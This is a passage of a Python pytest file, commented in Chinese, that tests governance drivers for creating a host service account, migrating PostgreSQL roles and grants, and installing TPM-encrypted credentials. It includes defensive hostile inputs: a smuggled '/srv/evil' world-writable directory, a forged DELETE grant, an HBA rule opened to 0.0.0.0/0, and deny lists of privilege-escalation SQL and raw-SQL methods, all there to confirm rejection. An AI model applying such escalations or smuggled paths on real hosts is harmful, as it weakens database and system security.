"""S2.4(WP4·W3b)五個 APPLY component driver 的 focused 測試(§4 / §5.3 / §5.4 / §7 / §8)。

證明(逐 row):

- source lane(``driver=None``)一律 typed ``EXTERNAL_VERIFICATION_PENDING``、零變更、零
  driver 接觸;
- §4 row ABI:每 row 綁定凍結矩陣的 exact adapter / actor / 獨立 postcheck / rollback 契約;
  跨 class 的 intent 替換在任何主機接觸之前即拒;
- §10.5 #31:host identity effect 只能分類為 ``HOST_IDENTITY_INSTALL``,且**只有 PG permit**
  時 typed 拒絕並明文點名該縫;
- §10.5 #37:service-account 屬性漂移(uid/gid/shell/home/locked/supplementary/expiry)與目錄
  owner/mode 漂移在第一次變更之前失敗;
- §5.3:exact desired + 無 ownership → ``PREEXISTING_UNOWNED_STATE``(絕不收養);
- §7/§10.5 #26/#32:兩把 sealed handle、封閉 DSN 八鍵、加密 blob 指紋、A→B→A rotation 的
  exact 補償、以及任何序列化面的秘密掃描;
- §8.1:``/opt`` 三根的 target 路徑由內容 digest 導出(caller 無從遞交);樹 mode/owner/ACL/
  symlink/原子性任一不符即補償;
- §8.3:unit 安裝後 loaded+inactive+disabled+無 drop-in;driver 上出現任何 enable/start/
  restart/signal 面即 typed 拒;
- 硬邊界 4:caller 遞交 raw shell/SQL/unit 文本/任意路徑/秘密一律 typed 拒。
"""
from __future__ import annotations

import sys
from copy import deepcopy
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
HELPERS = ROOT / "helper_scripts/maintenance_scripts"
ML_ROOT = ROOT / "program_code/ml_training"
PROGRAM_CODE = ROOT / "program_code"
for candidate in (HELPERS, ML_ROOT, PROGRAM_CODE, ROOT / "tests/structure"):
    if str(candidate) not in sys.path:
        sys.path.insert(0, str(candidate))

import agent_governance_s2_4_apply as apply_mod  # noqa: E402
import agent_governance_s2_4_credential as credential  # noqa: E402
import agent_governance_s2_4_prepare as prepare  # noqa: E402
import aiml_gate_receipt_validator as validator  # noqa: E402
import s2_4_w3b_testkit as kit  # noqa: E402

_PLAN_DIGEST = "sha256:" + "1" * 64
_PRE_STATE = "sha256:" + "2" * 64
_AGGREGATE_AUTH_ID = "sha256:" + "4" * 64
_PG_AUTH_ID = "sha256:" + "5" * 64
_UID = 947
_GID = 947
_CAPTURE = kit.CAPTURE_DIGEST
_BLOB_DIGEST = "sha256:" + "d" * 64
_BASE_TREE = "sha256:" + "c" * 64
_APP_BUNDLE = "sha256:" + "d" * 64
_LAUNCH_BUNDLE = "sha256:" + "e" * 64


# ── 共用 fixtures ───────────────────────────────────────────────────────────────
@pytest.fixture()
def signed(tmp_path, monkeypatch):
    private_key, public_key, fingerprint = kit.mint_key(tmp_path)
    kit.install_pinned_key(monkeypatch, public_key, fingerprint)
    return {
        "private_key": private_key,
        "apply_aggregate": kit.authorization(
            private_key, profile_key="apply_aggregate", authorization_id=_AGGREGATE_AUTH_ID
        ),
        "pg_migration": kit.authorization(
            private_key, profile_key="pg_migration", authorization_id=_PG_AUTH_ID
        ),
    }


def _intent(component_effect_class: str, required_intent_fields: dict) -> dict:
    return apply_mod.build_component_effect_intent(
        component_effect_class=component_effect_class,
        install_plan_digest=_PLAN_DIGEST, pre_state_digest=_PRE_STATE,
        required_intent_fields=required_intent_fields, expires_at=kit.EXPIRES,
    )


def _common(signed, *, pg: bool = False) -> dict:
    auth_set = {"apply_aggregate": signed["apply_aggregate"]}
    if pg:
        auth_set["pg_migration"] = signed["pg_migration"]
    return {
        "authorization_set": auth_set,
        "replay_ledger": kit.replay_ledger(),
        "now": kit.NOW,
        "clock": kit.frozen_clock(),
    }


class _PostcheckMixin:
    """所有 fake driver 共用的相異 verifier postcheck(applier 不得自證)。"""

    postcheck_ok = True

    def independent_postcheck(self, *, component_effect_class, install_plan_digest, applier_node):
        self.calls.append("independent_postcheck")
        return {
            "verifier_node": "s2-4-independent-verifier",
            "observed_subject_digest": "sha256:" + "8" * 64,
            "applied_state_verified": self.postcheck_ok,
            "pre_state_lineage_verified": self.postcheck_ok,
            "verifier_capture_digest": _CAPTURE,
        }

    def trusted_host_time(self):
        return kit.NOW

    def journal_transition(self, *, entry):
        self.calls.append("journal:" + entry["state"])


# ══════════════════════════ 1) HOST_IDENTITY_INSTALL ═══════════════════════════
class _FakeHostIdentityDriver(_PostcheckMixin):
    evidence_class = "PLATFORM_ATTESTED"

    def __init__(self, *, identity=None, directories=None, postcheck_ok=True,
                 fail_at=None, compensation_ok=True):
        self.calls: list[str] = []
        self.identity = identity
        self.directories = dict(directories or {})
        self.postcheck_ok = postcheck_ok
        self.fail_at = fail_at
        self.compensation_ok = compensation_ok
        self.removed: list[str] = []

    def observe_identity(self, *, name):
        self.calls.append("observe_identity")
        if self.identity is not None:
            return dict(self.identity)
        if "create_system_account" in self.calls:
            return apply_mod.host_identity_desired_state(uid=_UID, gid=_GID)
        return None

    def create_system_account(self, *, name, uid, gid, home, shell):
        self.calls.append("create_system_account")
        if self.fail_at == "create_system_account":
            raise RuntimeError("injected identity failure")

    def remove_system_account(self, *, name):
        self.calls.append("remove_system_account")
        if not self.compensation_ok:
            raise RuntimeError("compensation failed")

    def observe_directory(self, *, path):
        self.calls.append("observe_directory")
        if path in self.directories:
            return dict(self.directories[path])
        if f"create_directory:{path}" in self.calls:
            return next(
                dict(entry) for entry in apply_mod.host_identity_directory_tree()
                if entry["path"] == path
            )
        return None

    def create_directory(self, *, path, owner, group, mode):
        self.calls.append(f"create_directory:{path}")
        if self.fail_at == path:
            raise RuntimeError("injected directory failure")

    def remove_directory(self, *, path):
        self.calls.append(f"remove_directory:{path}")
        self.removed.append(path)
        if not self.compensation_ok:
            raise RuntimeError("compensation failed")


def _host_identity_intent(uid: int = _UID, gid: int = _GID) -> tuple[dict, dict]:
    manifest = apply_mod.build_uid_gid_directory_manifest(uid=uid, gid=gid)
    intent = _intent(
        "HOST_IDENTITY_INSTALL",
        {"uid_gid_directory_manifest_digest": validator.canonical_digest(manifest)},
    )
    return intent, manifest


def test_host_identity_source_lane_is_pending_with_zero_mutation(signed) -> None:
    intent, manifest = _host_identity_intent()
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=None, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "EXTERNAL_VERIFICATION_PENDING"
    assert verdict["mutation_performed"] is False and verdict["driver_engaged"] is False
    assert verdict["result"] is None and verdict["blocks_aggregate"] is True
    assert verdict["row_abi"]["adapter_id"] == "s2_4_host_identity_adapter_v1"
    assert verdict["row_abi"]["actor_node_id"] == "s2_4_host_identity_actor"
    assert verdict["row_abi"]["independent_postcheck_node_id"] == "s2_4_host_identity_postcheck_v1"
    assert verdict["row_abi"]["recovery_contract"] == "s2_4_host_identity_rollback_v1"
    assert verdict["production_authority_flags"] == {
        "nine_authorities_false": True,
        "production_apply_performed": False,
        "running_attested": False,
    }


def test_host_identity_apply_creates_the_exact_account_and_tree(signed) -> None:
    intent, manifest = _host_identity_intent()
    driver = _FakeHostIdentityDriver()
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "SATISFIED", verdict["reasons"]
    assert validator.validate_aiml_artifact(verdict["result"]) == []
    assert validator.validate_aiml_artifact(verdict["postcheck"]) == []
    assert validator.validate_aiml_artifact(verdict["rollback"]) == []
    assert verdict["result"]["status"] == "SATISFIED"
    assert verdict["result"]["production_authority_flags"]["running_attested"] is False
    identity = verdict["observed_subjects"]["identity"]
    assert identity["shell"] == "/usr/sbin/nologin"
    assert identity["password_locked"] is True
    assert identity["supplementary_groups"] == []
    assert identity["account_expiry"] is None
    assert identity["uid"] == _UID and identity["gid"] == _GID
    assert sorted(entry["path"] for entry in apply_mod.host_identity_directory_tree()) == sorted(
        verdict["observed_subjects"]["directories"]
    )
    assert driver.calls[0] == "observe_identity"


@pytest.mark.parametrize("attribute,value", [
    ("uid", 1000), ("gid", 1000), ("shell", "/bin/bash"), ("home", "/home/aiml"),
    ("password_locked", False), ("supplementary_groups", ["sudo"]),
    ("account_expiry", "2031-01-01"), ("system_account", False),
])
def test_service_account_attribute_drift_fails_before_mutation(signed, attribute, value) -> None:
    intent, manifest = _host_identity_intent()
    drifted = apply_mod.host_identity_desired_state(uid=_UID, gid=_GID)
    drifted[attribute] = value
    driver = _FakeHostIdentityDriver(identity=drifted)
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "PRESTATE_MISMATCH"
    assert verdict["mutation_performed"] is False
    assert "create_system_account" not in driver.calls
    assert any("before any mutation" in reason for reason in verdict["reasons"])


def test_directory_mode_or_owner_drift_fails_before_mutation(signed) -> None:
    intent, manifest = _host_identity_intent()
    tree = apply_mod.host_identity_directory_tree()
    drifted = {tree[0]["path"]: {**tree[0], "mode": "0777"}}
    driver = _FakeHostIdentityDriver(
        identity=apply_mod.host_identity_desired_state(uid=_UID, gid=_GID), directories=drifted
    )
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "PRESTATE_MISMATCH"
    assert not any(call.startswith("create_directory") for call in driver.calls)


def test_exact_desired_identity_without_ownership_is_never_adopted(signed) -> None:
    intent, manifest = _host_identity_intent()
    driver = _FakeHostIdentityDriver(
        identity=apply_mod.host_identity_desired_state(uid=_UID, gid=_GID),
        directories={
            entry["path"]: dict(entry) for entry in apply_mod.host_identity_directory_tree()
        },
    )
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "PREEXISTING_UNOWNED_STATE"
    assert verdict["mutation_performed"] is False


def test_exact_desired_identity_with_ownership_is_noop_verified(signed) -> None:
    intent, manifest = _host_identity_intent()
    owned = {"s2_4_receipt_digest": "sha256:" + "a" * 64, "journal_digest": "sha256:" + "b" * 64}
    tree = apply_mod.host_identity_directory_tree()
    driver = _FakeHostIdentityDriver(
        identity=apply_mod.host_identity_desired_state(uid=_UID, gid=_GID),
        directories={entry["path"]: dict(entry) for entry in tree},
    )
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest,
        ownership_evidence={"identity": owned, **{entry["path"]: owned for entry in tree}},
        **_common(signed),
    )
    assert verdict["status"] == "NOOP_VERIFIED"
    assert verdict["mutation_performed"] is False
    assert verdict["result"]["status"] == "NOOP_VERIFIED"


def test_a_pg_permit_cannot_authorize_host_identity_mutation(signed) -> None:
    intent, manifest = _host_identity_intent()
    driver = _FakeHostIdentityDriver()
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, {"pg_migration": signed["pg_migration"]}, driver,
        uid_gid_directory_manifest=manifest, replay_ledger=kit.replay_ledger(),
        now=kit.NOW, clock=kit.frozen_clock(),
    )
    assert verdict["status"] == "AUTHORIZATION_REJECTED"
    assert any("PG-migration permit cannot authorize" in reason for reason in verdict["reasons"])
    assert driver.calls == []


def test_host_identity_effects_classify_only_as_host_identity_install() -> None:
    for subject in ("host_user", "host_group", "host_directory"):
        assert apply_mod.derive_host_identity_effect_class_status(
            subject_kind=subject, declared_class="HOST_IDENTITY_INSTALL"
        )["status"] == "HOST_IDENTITY_CLASSIFICATION_ADMITTED"
        for other in ("PG_ROLE_ACL_MIGRATION", "CREDENTIAL_INSTALL", "LEARNING_RUNTIME",
                      "ENGINE_SCANNER", "NONE"):
            verdict = apply_mod.derive_host_identity_effect_class_status(
                subject_kind=subject, declared_class=other
            )
            assert verdict["status"] == "HOST_IDENTITY_CLASSIFICATION_REJECTED"
            assert any("#31" in reason for reason in verdict["reasons"])


def test_host_identity_failure_compensates_only_task_owned_creations(signed) -> None:
    intent, manifest = _host_identity_intent()
    tree = apply_mod.host_identity_directory_tree()
    driver = _FakeHostIdentityDriver(fail_at=tree[-1]["path"])
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert verdict["rollback"]["no_secret_reconstructed"] is True
    assert "remove_system_account" in driver.calls
    assert driver.removed == [entry["path"] for entry in reversed(tree[:-1])]


def test_host_identity_postcheck_failure_rolls_back(signed) -> None:
    intent, manifest = _host_identity_intent()
    driver = _FakeHostIdentityDriver(postcheck_ok=False)
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "POSTCHECK_FAILED_ROLLED_BACK"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert "remove_system_account" in driver.calls


def test_host_identity_manifest_must_bind_the_signed_digest(signed) -> None:
    intent, _ = _host_identity_intent()
    driver = _FakeHostIdentityDriver()
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver,
        uid_gid_directory_manifest=apply_mod.build_uid_gid_directory_manifest(uid=1, gid=1),
        **_common(signed),
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert driver.calls == []


def test_host_identity_manifest_cannot_smuggle_a_worker_chosen_directory(signed) -> None:
    manifest = apply_mod.build_uid_gid_directory_manifest(uid=_UID, gid=_GID)
    manifest["static_directories"].append(
        {"path": "/srv/evil", "owner": "root", "group": "root", "mode": "0777"}
    )
    intent = _intent(
        "HOST_IDENTITY_INSTALL",
        {"uid_gid_directory_manifest_digest": validator.canonical_digest(manifest)},
    )
    driver = _FakeHostIdentityDriver()
    verdict = apply_mod.apply_s2_4_host_identity(
        intent, driver=driver, uid_gid_directory_manifest=manifest, **_common(signed)
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert driver.calls == []


# ══════════════════════════ 2) PG_ROLE_ACL_MIGRATION ═══════════════════════════
class _FakePgDriver(_PostcheckMixin):
    evidence_class = "PLATFORM_ATTESTED"

    def __init__(self, *, role=None, postcheck_ok=True, fail_at=None):
        self.calls: list[str] = []
        self.role = role
        self.postcheck_ok = postcheck_ok
        self.fail_at = fail_at
        self.applied_statements: list[str] = []
        self.revoked_statements: list[str] = []
        self.public_restored: list[str] = []
        self.public_pre_state: dict = {}
        self.dropped = False

    def observe_role(self, *, role_name):
        self.calls.append("observe_role")
        return dict(self.role) if self.role else None

    def create_role_with_sealed_password(self, *, role_name, secret_handle, operation_id):
        self.calls.append("create_role_with_sealed_password")
        assert isinstance(secret_handle, credential.SealedSecretHandle)
        secret_handle.consume(operation_id=operation_id)

    def apply_manifest_grants(self, *, generated_statements):
        self.calls.append("apply_manifest_grants")
        if self.fail_at == "apply_manifest_grants":
            raise RuntimeError("injected grant failure")
        self.applied_statements = list(generated_statements)

    def observe_grants(self, *, role_name):
        self.calls.append("observe_grants")
        return {"tables": len(kit.PG_ACL_MANIFEST["tables"])}

    def observe_public_defaults(self, *, database, schemas):
        self.calls.append("observe_public_defaults")
        return dict(self.public_pre_state)

    def revoke_manifest_grants(self, *, generated_statements):
        self.calls.append("revoke_manifest_grants")
        self.revoked_statements = list(generated_statements)

    def restore_public_defaults(self, *, generated_statements):
        self.calls.append("restore_public_defaults")
        self.public_restored = list(generated_statements)

    def drop_task_owned_role(self, *, role_name):
        self.calls.append("drop_task_owned_role")
        self.dropped = True


def _pg_intent(attestation: dict) -> dict:
    return _intent(
        "PG_ROLE_ACL_MIGRATION",
        {
            "topology_attestation_digest": attestation["self_digest"],
            "acl_manifest_digest": kit.PG_ACL_MANIFEST["self_digest"],
            "pg_migration_permit_digest": "sha256:" + "6" * 64,
            "admin_handle_descriptor_digest": "sha256:" + "7" * 64,
        },
    )


def _pg_kwargs(attestation, **overrides):
    handle = credential.SecretBroker(operation_id="pg-op").mint_first_provisioning_handles()[0]
    payload = {
        "acl_manifest": deepcopy(kit.PG_ACL_MANIFEST),
        "topology_attestation": attestation,
        "expected_topology": kit.topology_expected(attestation),
        "secret_handle": handle,
        "operation_id": "pg-op",
    }
    payload.update(overrides)
    return payload


def test_pg_source_lane_is_pending_with_zero_mutation(signed) -> None:
    attestation = kit.topology_attestation()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=None, **_pg_kwargs(attestation),
        **_common(signed, pg=True),
    )
    assert verdict["status"] == "EXTERNAL_VERIFICATION_PENDING"
    assert verdict["mutation_performed"] is False and verdict["driver_engaged"] is False
    assert verdict["row_abi"]["adapter_id"] == "s2_4_pg_role_acl_adapter_v1"
    assert verdict["row_abi"]["actor_node_id"] == "s2_4_pg_admin_actor"
    assert verdict["row_abi"]["required_authorization_profiles"] == [
        "apply_aggregate", "pg_migration"
    ]


def test_pg_row_requires_both_the_aggregate_and_pg_permits(signed) -> None:
    attestation = kit.topology_attestation()
    driver = _FakePgDriver()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), {"apply_aggregate": signed["apply_aggregate"]}, driver,
        replay_ledger=kit.replay_ledger(), now=kit.NOW, clock=kit.frozen_clock(),
        **_pg_kwargs(attestation),
    )
    assert verdict["status"] == "AUTHORIZATION_REJECTED"
    assert driver.calls == []


def test_pg_apply_uses_only_manifest_generated_sql(signed) -> None:
    attestation = kit.topology_attestation()
    driver = _FakePgDriver()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver, **_pg_kwargs(attestation),
        **_common(signed, pg=True),
    )
    assert verdict["status"] == "SATISFIED", verdict["reasons"]
    expected = apply_mod.generate_manifest_grant_statements(deepcopy(kit.PG_ACL_MANIFEST))
    assert driver.applied_statements == expected
    # 生成序列中沒有 wildcard / GRANT OPTION / role membership / OWNER / 提權屬性。
    joined = " ".join(expected)
    for forbidden in ("WITH GRANT OPTION", "GRANT ALL ON SCHEMA", "GRANT ALL ON TABLE",
                      'GRANT "aiml', "OWNER TO", " CREATEDB", " SUPERUSER", " REPLICATION",
                      " BYPASSRLS", "ALTER DEFAULT PRIVILEGES"):
        assert forbidden not in joined, forbidden
    # 每一條 GRANT 都只針對 manifest 上的 database/schema/table。
    granted = [statement for statement in expected if statement.startswith("GRANT ")]
    allowed = (
        {f'"{entry["name"]}"' for entry in kit.PG_ACL_MANIFEST["schemas"]}
        | {f'"{kit.PG_ACL_MANIFEST["database"]["name"]}"'}
        | {
            f'"{entry["name"].split(".", 1)[0]}"."{entry["name"].split(".", 1)[1]}"'
            for entry in kit.PG_ACL_MANIFEST["tables"]
        }
    )
    assert granted and all(any(target in stmt for target in allowed) for stmt in granted)
    assert validator.validate_aiml_artifact(verdict["result"]) == []


def test_pg_driver_has_no_raw_sql_or_host_mutation_surface() -> None:
    protocol_members = set(apply_mod.PgRoleAclDriver.__annotations__) | {
        name for name in dir(apply_mod.PgRoleAclDriver) if not name.startswith("_")
    }
    for forbidden in ("execute", "execute_sql", "run_sql", "psql", "create_directory",
                      "create_system_account", "install_unit_fragment"):
        assert forbidden not in protocol_members


@pytest.mark.parametrize("drift", ["listener", "proxy", "cluster", "admin", "hba"])
def test_topology_drift_blocks_the_pg_row(signed, drift) -> None:
    observation = kit.topology_observation()
    baseline = kit.topology_expected(kit.topology_attestation())
    if drift == "listener":
        observation["runtime_listener"]["socket_inode"] = 9999
    elif drift == "proxy":
        observation["proxy_hops"] = [{"config_digest": "sha256:" + "1" * 64,
                                      "upstream_endpoint": "127.0.0.1:6543"}]
    elif drift == "cluster":
        observation["cluster_identity"]["system_identifier"] = "7000000000000000002"
    elif drift == "admin":
        observation["admin_endpoint"] = {"endpoint_class": "port_5432", "handle_class": "127.0.0.1:5432"}
    else:
        observation["effective_hba_rule"]["source"] = "0.0.0.0/0"
    attestation = kit.topology_attestation(observation)
    driver = _FakePgDriver()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver,
        **_pg_kwargs(attestation, expected_topology=baseline), **_common(signed, pg=True),
    )
    assert verdict["status"] == "PG_TOPOLOGY_UNPROVEN"
    assert driver.calls == []


def test_pre_existing_pg_role_without_ownership_is_never_re_passworded(signed) -> None:
    attestation = kit.topology_attestation()
    driver = _FakePgDriver(role={"attributes": {"login": True}})
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver, **_pg_kwargs(attestation),
        **_common(signed, pg=True),
    )
    assert verdict["status"] == "PREEXISTING_UNOWNED_STATE"
    assert "create_role_with_sealed_password" not in driver.calls
    assert "apply_manifest_grants" not in driver.calls


def test_pg_failure_revokes_only_this_plans_grants_and_drops_only_a_new_role(signed) -> None:
    attestation = kit.topology_attestation()
    driver = _FakePgDriver(fail_at="apply_manifest_grants")
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver, **_pg_kwargs(attestation),
        **_common(signed, pg=True),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert driver.dropped is True
    assert all(statement.startswith("REVOKE") for statement in driver.revoked_statements)
    # observer 身分永不被本 row 觸及。
    assert not any("aiml_observer_ro" in statement for statement in driver.revoked_statements)
    # 前態未持有 → 補償絕不「還原」出本 plan 沒拿走過的 PUBLIC 權限。
    assert driver.public_restored == []


def test_public_default_privileges_are_restored_only_when_the_pre_state_held_them(signed) -> None:
    attestation = kit.topology_attestation()
    driver = _FakePgDriver(fail_at="apply_manifest_grants")
    driver.public_pre_state = {
        "database:trading_ai:TEMPORARY": True,
        "database:trading_ai:CREATE": False,
        "schema:learning:CREATE": False,
        "schema:trading:CREATE": True,
    }
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver, **_pg_kwargs(attestation),
        **_common(signed, pg=True),
    )
    assert verdict["status"] == "FAILED"
    assert verdict["rollback"]["status"] == "COMPENSATED_EXACT"
    assert driver.public_restored == [
        'GRANT TEMPORARY ON DATABASE "trading_ai" TO PUBLIC',
        'GRANT CREATE ON SCHEMA "trading" TO PUBLIC',
    ]


def test_pg_row_rejects_a_forged_acl_manifest(signed) -> None:
    attestation = kit.topology_attestation()
    forged = deepcopy(kit.PG_ACL_MANIFEST)
    forged["tables"].append({"name": "learning.alr_retention_events", "privileges": ["DELETE"]})
    driver = _FakePgDriver()
    verdict = apply_mod.apply_s2_4_pg_role_acl(
        _pg_intent(attestation), driver=driver,
        **_pg_kwargs(attestation, acl_manifest=forged), **_common(signed, pg=True),
    )
    assert verdict["status"] == "PRECHECK_FAILED"
    assert driver.calls == []


# ══════════════════════════ 3) CREDENTIAL_INSTALL ══════════════════════════════
class _FakeCredentialDriver(_PostcheckMixin):
    evidence_class = "PLATFORM_ATTESTED"

    def __init__(self, *, slot=None, capability=None, postcheck_ok=True,
                 login_ok=True, dsn_keys=None, fail_at=None, blob_digest=_BLOB_DIGEST):
        self.calls: list[str] = []
        self.slot = slot
        self.capability = capability or {
            "systemd_creds_available": True, "tpm2_available": True,
            "decryption_name_verification": True,
        }
        self.postcheck_ok = postcheck_ok
        self.login_ok = login_ok
        self.dsn_keys = dsn_keys
        self.fail_at = fail_at
        self.blob_digest = blob_digest
        self.encrypt_argv: list[str] = []
        self.restored = None
        self.removed = False
        self.consumed_dsn: bytes | None = None

    def host_credential_capability(self):
        self.calls.append("host_credential_capability")
        return dict(self.capability)

    def observe_credential_slot(self, *, slot_path):
        self.calls.append("observe_credential_slot")
        return dict(self.slot) if self.slot else None

    def encrypt_credential(self, *, name, with_key, dsn_handle, operation_id):
        self.calls.append("encrypt_credential")
        # driver 只拿到 sealed handle;明文只在此有界操作內存在,絕不回傳/記錄。
        assert isinstance(dsn_handle, credential.SealedSecretHandle)
        self.consumed_dsn = dsn_handle.consume(operation_id=operation_id)
        self.encrypt_argv = list(credential.CREDENTIAL_ENCRYPT_COMMAND) + [
            f"--name={name}", f"--with-key={with_key}"
        ]
        if self.fail_at == "encrypt_credential":
            raise RuntimeError("injected encryption failure")
        return {"encrypted_blob_digest": self.blob_digest, "argv": self.encrypt_argv}

    def install_encrypted_slot(self, *, slot_path, encrypted_blob_digest, owner, group, mode):
        self.calls.append("install_encrypted_slot")
        if self.fail_at == "install_encrypted_slot":
            raise RuntimeError("injected slot failure")
        return {
            "encrypted_blob_digest": encrypted_blob_digest, "owner": owner,
            "group": group, "mode": mode, "plaintext_written": False,
        }

    def independent_login_postcheck(self, *, slot_path, role, endpoint, applier_node):
        self.calls.append("independent_login_postcheck")
        return {
            "verifier_node": "s2-4-credential-verifier",
            "login_verified": self.login_ok,
            "decrypted_via_credential_custody": True,
            "observed_dsn_keys": list(
                self.dsn_keys if self.dsn_keys is not None else credential.CLOSED_DSN_KEYS
            ),
            "verifier_capture_digest": _CAPTURE,
            "observed_subject_digest": "sha256:" + "9" * 64,
        }

    def restore_previous_slot(self, *, slot_path, previous_encrypted_blob_digest):
        self.calls.append("restore_previous_slot")
        self.restored = previous_encrypted_blob_digest
        return {"encrypted_blob_digest": previous_encrypted_blob_digest}

    def remove_task_owned_slot(self, *, slot_path):
        self.calls.append("remove_task_owned_slot")
        self.removed = True
        return {"slot_absent": True}


def _credential_intent(blob_digest: str = _BLOB_DIGEST) -> dict:
    return _intent(
        "CREDENTIAL_INSTALL",
        {
            "credential_name": credential.CREDENTIAL_UNIT_NAME,
            "encrypted_blob_digest": blob_digest,
            "host_identity_digest": validator.canonical_digest(
                apply_mod.host_identity_desired_state(uid=_UID, gid=_GID)
            ),
        },
    )


def _broker_handles():
    broker = credential.SecretBroker(operation_id="cred-op")
    return broker, broker.mint_first_provisioning_handles()


def test_credential_source_lane_is_pending_with_zero_mutation(signed) -> None:
    _, (_pg_handle, dsn_handle) = _broker_handles()
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=None, dsn_handle=dsn_handle,
        operation_id="cred-op", **_common(signed),
    )
    assert verdict["status"] == "EXTERNAL_VERIFICATION_PENDING"
    assert verdict["mutation_performed"] is False and verdict["driver_engaged"] is False
    assert verdict["row_abi"]["adapter_id"] == "s2_4_credential_install_adapter_v1"
    assert verdict["row_abi"]["actor_node_id"] == "s2_4_host_secret_actor"
    assert dsn_handle.consumed is False


def test_first_provisioning_uses_two_handles_and_leaks_no_secret(signed) -> None:
    broker, (pg_handle, dsn_handle) = _broker_handles()
    password = pg_handle.consume(operation_id="cred-op")
    driver = _FakeCredentialDriver()
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
        operation_id="cred-op", **_common(signed),
    )
    assert verdict["status"] == "SATISFIED", verdict["reasons"]
    # 兩把 handle 各被消費一次,且第二次消費一律拒。
    assert dsn_handle.consumed is True
    with pytest.raises(credential.CredentialContractError):
        dsn_handle.consume(operation_id="cred-op")
    # driver 收到的 DSN 是封閉八鍵且含該密碼;但任何序列化面都不得有秘密。
    rendered = driver.consumed_dsn.decode("ascii")
    assert rendered.startswith("host=127.0.0.1 port=5432 dbname=trading_ai user=aiml_engine_scanner")
    assert password.decode("ascii") in rendered
    for artifact in (verdict["result"], verdict["postcheck"], verdict["rollback"],
                     verdict["reasons"], verdict["observed_subjects"], verdict["journal_entries"]):
        credential.assert_no_secret_material(artifact, [password, rendered])
    # 指紋是「加密 blob + 固定 metadata」的 digest,絕非密碼/明文 DSN 的 digest。
    assert verdict["encrypted_credential_fingerprint"] == (
        credential.encrypted_credential_fingerprint(encrypted_blob_digest=_BLOB_DIGEST)
    )
    assert driver.encrypt_argv == [
        "systemd-creds", "encrypt", "--name=pg-dsn", "--with-key=host+tpm2"
    ]
    broker.zeroize_all()


def test_sealed_handles_are_not_serializable() -> None:
    _, (pg_handle, dsn_handle) = _broker_handles()
    import copy
    import json as _json
    import pickle

    for handle in (pg_handle, dsn_handle):
        assert "redacted" in repr(handle) and "redacted" in str(handle)
        assert "redacted" in f"{handle}"
        with pytest.raises(credential.CredentialContractError):
            pickle.dumps(handle)
        with pytest.raises(credential.CredentialContractError):
            copy.deepcopy(handle)
        with pytest.raises(credential.CredentialContractError):
            bytes(handle)
        with pytest.raises(TypeError):
            _json.dumps({"handle": handle})
        with pytest.raises(credential.CredentialContractError):
            handle.consume(operation_id="wrong-operation")


@pytest.mark.parametrize("capability", [
    {"systemd_creds_available": False, "tpm2_available": True, "decryption_name_verification": True},
    {"systemd_creds_available": True, "tpm2_available": False, "decryption_name_verification": True},
    {"systemd_creds_available": True, "tpm2_available": True, "decryption_name_verification": False},
])
def test_missing_encrypted_credential_capability_blocks_with_zero_mutation(signed, capability) -> None:
    _, (_pg, dsn_handle) = _broker_handles()
    driver = _FakeCredentialDriver(capability=capability)
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
        operation_id="cred-op", **_common(signed),
    )
    assert verdict["status"] == "HOST_CREDENTIAL_CAPABILITY_UNSATISFIED"
    assert "encrypt_credential" not in driver.calls
    assert "install_encrypted_slot" not in driver.calls


@pytest.mark.parametrize("keys", [
    [key for key in credential.CLOSED_DSN_KEYS if key != "sslmode"],
    list(credential.CLOSED_DSN_KEYS) + ["passfile"],
    list(credential.CLOSED_DSN_KEYS) + ["hostaddr"],
    list(credential.CLOSED_DSN_KEYS) + ["options"],
    list(credential.CLOSED_DSN_KEYS) + ["sslkey"],
    list(credential.CLOSED_DSN_KEYS) + ["service"],
    list(credential.CLOSED_DSN_KEYS) + ["servicefile"],
])
def test_non_closed_dsn_key_sets_are_rejected(signed, keys) -> None:
    assert credential.derive_closed_dsn_key_status(keys)["status"] == "CLOSED_DSN_REJECTED"
    _, (_pg, dsn_handle) = _broker_handles()
    driver = _FakeCredentialDriver(dsn_keys=keys)
    verdict = apply_mod.apply_s2_4_credential_install(
        _credential_intent(), driver=driver, dsn_handle=dsn_handle,
